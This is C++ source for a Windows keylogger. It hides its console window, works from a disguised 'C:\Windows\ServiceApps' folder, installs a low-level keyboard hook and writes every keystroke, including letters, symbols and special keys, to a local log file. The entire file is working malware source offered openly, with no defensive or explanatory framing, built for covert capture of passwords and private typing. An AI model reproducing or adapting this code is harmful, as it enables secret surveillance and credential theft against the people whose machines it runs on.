#include "Logger.h"

Keylogger::Keylogger() {
	CreateDirectory(L"C:\\Windows\\ServiceApps", NULL);
	SetCurrentDirectoryA("C:\\Windows\\ServiceApps");
	_hExe = GetModuleHandle(NULL);
	_hKey = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, _hExe, NULL);
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	while (GetMessage(&_msg, NULL, 0, 0) > 0) {
		TranslateMessage(&_msg);
		DispatchMessage(&_msg);
	}
}

Keylogger::~Keylogger() {
	UnhookWindowsHookEx(_hKey);
}

LRESULT __stdcall Keylogger::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	ofstream _outLogg;
	_outLogg.open("log.txt", std::ios_base::app);
	PKBDLLHOOKSTRUCT _keyHook = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
	DWORD vkCode = _keyHook->vkCode;

	switch (wParam) {
	case WM_KEYDOWN:

		if (GetAsyncKeyState(VK_SHIFT)) {
			switch (vkCode) {
			case 0x30: _outLogg << ")"; break;
			case 0x31: _outLogg << "!"; break;
			case 0x32: _outLogg << "@"; break;
			case 0x33: _outLogg << "#"; break;
			case 0x34: _outLogg << "$"; break;
			case 0x35: _outLogg << "%"; break;
			case 0x36: _outLogg << "^"; break;
			case 0x37: _outLogg << "&"; break;
			case 0x38: _outLogg << "*"; break;
			case 0x39: _outLogg << "("; break;
			case 0xBF: _outLogg << "?"; break;
			case 0xBB: _outLogg << "+"; break;
			case 0xBE: _outLogg << "<"; break;
			case 0xBD: _outLogg << "_"; break;
			case 0xE2: _outLogg << ">"; break;
			}
		}
		else {
			switch (vkCode) {

			case 0x30: _outLogg << "0"; break;
			case 0x31: _outLogg << "1"; break;
			case 0x32: _outLogg << "2"; break;
			case 0x33: _outLogg << "3"; break;
			case 0x34: _outLogg << "4"; break;
			case 0x35: _outLogg << "5"; break;
			case 0x36: _outLogg << "6"; break;
			case 0x37: _outLogg << "7"; break;
			case 0x38: _outLogg << "8"; break;
			case 0x39: _outLogg << "9"; break;
			case 0xBF: _outLogg << "/"; break;
			case 0xBB: _outLogg << "="; break;
			case 0xBC: _outLogg << ","; break;
			case 0xBE: _outLogg << "."; break;
			case 0xBD: _outLogg << "-"; break;
			case 0xE2: _outLogg << "<"; break;
			}
		}

		if (!(GetAsyncKeyState(VK_SHIFT))) {
			switch (vkCode) {

			case 0x41: _outLogg << "a"; break;
			case 0x42: _outLogg << "b"; break;
			case 0x43: _outLogg << "c"; break;
			case 0x44: _outLogg << "d"; break;
			case 0x45: _outLogg << "e"; break;
			case 0x46: _outLogg << "f"; break;
			case 0x47: _outLogg << "g"; break;
			case 0x48: _outLogg << "h"; break;
			case 0x49: _outLogg << "i"; break;
			case 0x4A: _outLogg << "j"; break;
			case 0x4B: _outLogg << "k"; break;
			case 0x4C: _outLogg << "l"; break;
			case 0x4D: _outLogg << "m"; break;
			case 0x4E: _outLogg << "n"; break;
			case 0x4F: _outLogg << "o"; break;
			case 0x50: _outLogg << "p"; break;
			case 0x51: _outLogg << "q"; break;
			case 0x52: _outLogg << "r"; break;
			case 0x53: _outLogg << "s"; break;
			case 0x54: _outLogg << "t"; break;
			case 0x55: _outLogg << "u"; break;
			case 0x56: _outLogg << "v"; break;
			case 0x57: _outLogg << "w"; break;
			case 0x58: _outLogg << "x"; break;
			case 0x59: _outLogg << "y"; break;
			case 0x5A: _outLogg << "z"; break;
			}
		}

		if ((GetAsyncKeyState(VK_SHIFT))) {
			switch (vkCode) {

			case 0x41: _outLogg << "A"; break;
			case 0x42: _outLogg << "B"; break;
			case 0x43: _outLogg << "C"; break;
			case 0x44: _outLogg << "D"; break;
			case 0x45: _outLogg << "E"; break;
			case 0x46: _outLogg << "F"; break;
			case 0x47: _outLogg << "G"; break;
			case 0x48: _outLogg << "H"; break;
			case 0x49: _outLogg << "I"; break;
			case 0x4A: _outLogg << "J"; break;
			case 0x4B: _outLogg << "K"; break;
			case 0x4C: _outLogg << "L"; break;
			case 0x4D: _outLogg << "M"; break;
			case 0x4E: _outLogg << "N"; break;
			case 0x4F: _outLogg << "O"; break;
			case 0x50: _outLogg << "P"; break;
			case 0x51: _outLogg << "Q"; break;
			case 0x52: _outLogg << "R"; break;
			case 0x53: _outLogg << "S"; break;
			case 0x54: _outLogg << "T"; break;
			case 0x55: _outLogg << "U"; break;
			case 0x56: _outLogg << "V"; break;
			case 0x57: _outLogg << "W"; break;
			case 0x58: _outLogg << "X"; break;
			case 0x59: _outLogg << "Y"; break;
			case 0x5A: _outLogg << "Z"; break;
			}
		}

		else {
			VK_SHIFT + KF_ALTDOWN;
		}

		switch (vkCode) {

		case VK_SPACE:    _outLogg << "[Space]";	 break;
		case 0x2E:	  _outLogg << "[Delete]";	 break;
		case VK_BACK:	  _outLogg << "[Backspace]";     break;
		case VK_RETURN:   _outLogg << "[Enter]";	 break;
		case VK_LCONTROL: _outLogg << "[Ctrl]";		 break;
		case VK_RCONTROL: _outLogg << "[Ctrl]";		 break;
		case VK_TAB:	  _outLogg << "[Tab]";		 break;
		case 0x25:	  _outLogg << "[Left Arrow]";    break;
		case 0x26:	  _outLogg << "[Up Arrow]";	 break;
		case 0x27:	  _outLogg << "[Right Arrow]";   break;
		case 0x28:	  _outLogg << "[Down Arrow]";    break;
		case VK_ESCAPE:	  _outLogg << "[Esc]";		 break;
		case VK_CAPITAL:  _outLogg << "[Caps Lock]";     break;
		case VK_RSHIFT:   _outLogg << "[Right Shift]";   break;
		case VK_LSHIFT:   _outLogg << "[Left Shift]";    break;
		case VK_LMENU:    _outLogg << "[Left Alt]";      break;
		case VK_RMENU:    _outLogg << "[Right Alt]";     break;
		case VK_LWIN:     _outLogg << "[Left Win]";	 break;
		case VK_RWIN:     _outLogg << "[Right Win]";	 break;
		case VK_INSERT:   _outLogg << "[Insert]";	 break;
		case VK_SCROLL:	  _outLogg << "[Scroll Lock]";   break;
		case VK_HOME:     _outLogg << "[Home]";		 break;
		case VK_END:      _outLogg << "[End]";		 break;
		case VK_PRIOR:    _outLogg << "[Page Up]";	 break;
		case VK_NEXT:     _outLogg << "[Page Down]";	 break;
		case VK_SNAPSHOT: _outLogg << "[Print Screen]";  break;
		case VK_OEM_1:    _outLogg << "[: ;]";		 break;
		case VK_OEM_3:    _outLogg << "[~ `]";		 break;
		case VK_OEM_4:	  _outLogg << "{[";		 break;
		case VK_OEM_6:	  _outLogg << "}]";		 break;
		case VK_OEM_7:	  _outLogg << "\"'";		 break;
		case VK_F1:	  _outLogg << "[F1]";		 break;
		case VK_F2:	  _outLogg << "[F2]";		 break;
		case VK_F3:	  _outLogg << "[F3]";		 break;
		case VK_F4:	  _outLogg << "[F4]";		 break;
		case VK_F5:	  _outLogg << "[F5]";		 break;
		case VK_F6:	  _outLogg << "[F6]";		 break;
		case VK_F7:	  _outLogg << "[F7]";		 break;
		case VK_F8:	  _outLogg << "[F8]";		 break;
		case VK_F9:	  _outLogg << "[F9]";		 break;
		case VK_F10:	  _outLogg << "[F10]";		 break;
		case VK_F11:	  _outLogg << "[F11]";		 break;
		case VK_F12:	  _outLogg << "[F12]";		 break;
		case VK_NUMPAD0:  _outLogg << "0";		 break;
		case VK_NUMPAD1:  _outLogg << "1";		 break;
		case VK_NUMPAD2:  _outLogg << "2";		 break;
		case VK_NUMPAD3:  _outLogg << "3";		 break;
		case VK_NUMPAD4:  _outLogg << "4";		 break;
		case VK_NUMPAD5:  _outLogg << "5";		 break;
		case VK_NUMPAD6:  _outLogg << "6";		 break;
		case VK_NUMPAD7:  _outLogg << "7";		 break;
		case VK_NUMPAD8:  _outLogg << "8";		 break;
		case VK_NUMPAD9:  _outLogg << "9";		 break;
		case 0x6F:	  _outLogg << "/";		 break;
		case 0x6A:	  _outLogg << "*";		 break;
		case 0x6D:	  _outLogg << "-";		 break;
		case 0x6B:	  _outLogg << "+";		 break;
		case 0x6E:	  _outLogg << ",";		 break;
		}
	}

	_outLogg.close();
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}